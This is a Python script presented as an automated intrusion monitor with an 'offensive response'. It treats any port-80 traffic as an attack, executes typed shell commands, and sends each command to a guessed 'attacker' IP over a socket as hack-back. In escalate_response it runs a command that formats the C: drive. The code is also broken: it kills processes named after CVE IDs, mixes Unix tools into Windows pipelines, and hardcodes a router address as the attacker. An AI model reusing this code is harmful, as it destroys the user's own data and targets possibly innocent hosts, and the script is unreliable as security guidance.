import os
import time
import subprocess
import datetime
import socket
import requests
from bs4 import BeautifulSoup

def monitor():
    while True:
        if detect_attack():
            log_dir = "attack_logs"
            if not os.path.exists(log_dir):
                os.mkdir(log_dir)

            log_file = os.path.join(log_dir, "Attacker_Tracker.txt")
            if not os.path.exists(log_file):
                with open(log_file, "w") as f:
                    f.write("Attack Logs:\n\n")

            with open(log_file, "a") as f:
                f.write("Attack detected at {}\n".format(datetime.datetime.now()))
                mirror_attack(f)

        time.sleep(10)

def detect_attack():
    # Check for unusual network traffic
    network_traffic = subprocess.check_output("netstat -a -n -o | findstr :80", shell=True).decode("utf-8")
    if network_traffic:
        return True
    return False

def mirror_attack(f):
    counter = 0
    while True:
        try:
            action = input("> ")
            os.system(action)
            f.write("{} - {}\n".format(datetime.datetime.now(), action))
            counter += 1
            offensive_response(counter)
            mirror_action_on_attacker(action)
        except KeyboardInterrupt:
            break

def offensive_response(counter):
    if counter == 1:
        block_attacker_ip()
    elif counter == 2:
        terminate_malicious_processes()
    elif counter >= 3:
        escalate_response()

def block_attacker_ip():
    attacker_ip = "192.168.1.1"
    os.system(f"powershell -Command New-NetFirewallRule -DisplayName 'Block attacker IP {attacker_ip}' -RemoteAddress {attacker_ip} -Action Block")

def terminate_malicious_processes():
    ioc_list = get_ioc_list()
    for ioc in ioc_list:
        os.system(f"taskkill /IM {ioc} /F")

def escalate_response():
    block_attacker_ip()
    terminate_malicious_processes()
    os.system("format C: /fs:NTFS /p:1")

def mirror_action_on_attacker(action):
    try:
        attacker_ip = subprocess.check_output("netstat -a -n -o | findstr :80 | awk '{print $5}' | cut -d ':' -f 1", shell=True).decode("utf-8").strip()
        attacker_port = 12345

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((attacker_ip, attacker_port))
        sock.sendall(action.encode('utf-8'))
        sock.close()
    except Exception as e:
        print(f"Error mirroring action on attacker's machine: {e}")

def get_ioc_list():
    url = "https://cve.mitre.org/data/downloads/allitems.html"
    page = requests.get(url)
    soup = BeautifulSoup(page.content, 'html.parser')
    cve_table = soup.find('table', {'id': 'DataTables_Table_0'})
    ioc_list = []

    for row in cve_table.findAll('tr')[1:]:
        cols = row.findAll('td')
        if cols[2].text == "CVE":
            cve_id = cols[3].text
            ioc_list.append(cve_id)

    ioc_list.extend(['CVE-2018-12130', 'CVE-2021-21972']) # Add some well-known IOCs
    return ioc_list

if __name__ == "__main__":
    monitor()
